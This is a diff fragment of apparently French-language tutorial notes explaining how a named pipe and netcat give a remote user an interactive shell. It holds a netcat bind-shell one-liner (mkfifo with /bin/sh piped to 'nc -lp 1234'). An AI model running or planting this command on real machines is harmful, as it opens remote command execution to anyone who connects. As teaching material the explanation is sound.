@@ -18,7 +18,7 @@ Content-Type: text/html; charset=iso-8859-1
 Le fichier `/tmp/f` stock les commandes entrées à distance via netcat. Ces commandes sont executées dans un shell dans l'ordre fifo. Ce shell est affiché à l'utilisateur distant.
 ```{r, engine='bash'}
 aas@ubuntu:~$ rm -f /tmp/f; mkfifo /tmp/f
-aas@ubuntu:~$ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 > /tmp/f
+aas@ubuntu:~$ cat /tmp/f | /bin/sh -i 2>&1 | nc -lp 1234 > /tmp/f
 
 ```
 Sur certaines version, on peut simplement faire (-d lit pas l'entrée standard) :
